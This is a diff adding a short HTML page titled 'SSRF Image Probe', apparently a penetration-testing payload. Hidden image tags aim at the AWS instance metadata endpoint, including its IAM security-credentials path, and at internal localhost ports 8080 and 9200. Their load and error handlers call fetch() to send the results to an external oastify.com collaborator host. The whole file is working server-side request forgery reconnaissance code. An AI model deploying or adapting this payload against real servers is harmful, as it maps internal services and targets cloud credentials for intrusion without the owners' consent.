@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Image Probe</title>
+</head>
+<body>
+    <script>
+    const collab = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com';
+    function report(url, success) {
+        fetch(collab + '/image-' + (success ? 'success' : 'fail') + '?url=' + encodeURIComponent(url));
+    }
+    </script>
+
+    <!-- AWS Metadata (requires header, but image will still get HTTP status) -->
+    <img src="http://169.254.169.254/latest/meta-data/" 
+         onload="report(this.src, true)" 
+         onerror="report(this.src, false)" 
+         style="display:none" />
+
+    <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" 
+         onload="report(this.src, true)" 
+         onerror="report(this.src, false)" 
+         style="display:none" />
+
+    <!-- Common internal services -->
+    <img src="http://127.0.0.1:8080" 
+         onload="report(this.src, true)" 
+         onerror="report(this.src, false)" 
+         style="display:none" />
+
+    <img src="http://127.0.0.1:9200" 
+         onload="report(this.src, true)" 
+         onerror="report(this.src, false)" 
+         style="display:none" />
+
+    <!-- Add more as needed -->
+</body>
+</html>
